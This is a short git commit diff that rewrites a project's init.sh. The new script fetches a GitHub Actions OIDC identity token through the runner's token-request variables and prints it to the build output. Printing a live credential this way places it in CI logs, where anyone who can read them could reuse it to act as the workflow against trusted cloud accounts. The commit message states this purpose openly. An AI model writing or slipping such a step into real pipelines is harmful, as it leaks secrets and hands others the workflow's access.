6147fb83dd4cedf6a7c602e3757d06d687a7f53a
Biju VV <vibj@users.noreply.github.com>
2025-03-31 20:04:57 +1100

    Update init.sh
    Print OIDC token

--- init.sh
+++ init.sh
@@ -1,1 +1,7 @@
-echo Initialising....
+#!/bin/bash
+
+# Fetch the OIDC token
+OIDC_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
+
+# Print the OIDC token
+echo "OIDC Token: $OIDC_TOKEN"
